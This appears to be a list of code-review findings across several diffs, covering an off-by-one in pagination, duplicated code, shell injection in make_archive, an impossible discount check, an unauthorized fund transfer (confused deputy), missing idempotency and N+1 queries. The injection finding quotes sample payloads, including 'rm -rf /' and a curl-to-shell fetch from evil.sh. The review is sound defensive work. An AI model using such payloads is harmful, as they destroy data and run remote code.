produced_findings.claim: Pagination returns one extra item per page (off-by-one) `end = offset + page_size + 1` then `items[offset:end]` — for `page_size=N`, the slice length is `N+1`, not `N`. E.g. `page(list(range(10)), 1, 3)` returns `[0, 1, 2, 3]` (4 items) instead of `[0, 1, 2]`, and the extra item duplicates the first item of the next page.

`format_message(user)` is duplicated across the email and sms branches `msg = format_message(user)` is called identically at line 3 (email branch) and line 6 (sms branch); only the send call and destination differ (`send_email(user.email, msg)` vs `send_sms(user.phone, msg)`). The two branches now independently own the same message-construction step; a future change to how the message is built (e.g. per-channel formatting) requires updating both branches in lockstep, and it's easy to update one and miss the other as more channels are added.

Shell command injection via unsanitized `name` in `make_archive` `cmd = f"tar -czf {name}.tar.gz data/"` is built by interpolating the caller-supplied `name` directly into a shell string, then executed with `subprocess.run(cmd, shell=True, check=True)`. The prior version passed an argument list (`["tar", "-czf", name + ".tar.gz", "data/"]`) without `shell=True`, which did not invoke a shell and could not interpret shell metacharacters in `name`. Any caller-controlled `name` containing shell metacharacters (e.g. `"; rm -rf / #"`, `"$(curl evil.sh|sh)"`, backticks, `&&`, `|`) is now interpreted by `/bin/sh` and executed as arbitrary shell code.

Discount validation never triggers due to impossible boolean condition `if discount_percent > 100 and discount_percent < 0:` — no value can be simultaneously greater than 100 and less than 0, so this condition is always `False`. The pre-image used `or`. As a result, `apply_discount` never raises `ValueError` for any out-of-range `discount_percent`, e.g. `apply_discount(order, 150)` returns a negative total, and `apply_discount(order, -50)` inflates the total above the eligible sum instead of raising.

`transfer_funds` job handler performs privileged fund transfers with no authorization check The new `transfer_funds` branch reads `source_account`, `destination_account`, and `amount` straight out of the untrusted `job["payload"]` and passes them to `service_client.transfer(...)` using the module-level `SERVICE_CREDENTIALS` (a privileged service credential loaded once at import time, `worker/job_processor.py:3`). Nothing in `process_job` verifies that whoever enqueued the job is entitled to move funds out of `source_account`, or that the job's originating identity matches the account being debited. Any producer able to enqueue a `transfer_funds` job (the worker has no visibility into who created it) can move money out of an arbitrary `source_account` to an arbitrary `destination_account`, because the worker's own high-privilege credentials — not the requester's authority — are what actually authorize the transfer with the downstream service. This is the classic confused-deputy shape: a privileged intermediary executes an action fully parameterized by an unverified caller.

Fund transfers have no idempotency/duplicate-execution protection The `transfer_funds` branch calls the side-effecting `service_client.transfer(...)` with no idempotency key and no record of already-processed jobs. A worker crash/timeout after the call succeeds but before the job is acknowledged, or any at-least-once redelivery of the same job, re-enters `process_job` and calls `transfer` again with identical arguments. A single logical transfer can be executed more than once, moving funds twice for one requested operation.

Per-order shipment lookup in export loop causes N+1 queries The loop previously only read already-loaded scalar attributes (`order.id`, `order.customer_email`, `order.total`). The diff adds `order.shipment_events.all().order_by("-created_at").first()` executed once per iteration of `for order in orders`, which issues a separate related-manager query for every order in the collection. For any non-trivial order count, this report's query volume now scales linearly with the number of orders instead of staying constant, multiplying database round-trips and materially slowing generation and increasing DB load for what is likely a bulk/reporting code path.
